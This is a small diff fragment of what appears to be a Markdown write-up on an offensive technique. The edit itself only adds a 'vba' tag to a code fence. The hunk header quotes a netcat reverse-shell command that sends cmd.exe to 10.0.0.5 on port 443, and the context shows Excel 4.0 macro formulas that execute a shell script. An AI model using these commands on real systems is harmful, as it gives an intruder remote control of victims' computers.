@@ -16,7 +16,7 @@ C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 
 We can then execute command by typing into the cells:
 
-```
+```vba
 =exec("c:\shell.cmd")
 =halt()
 ```
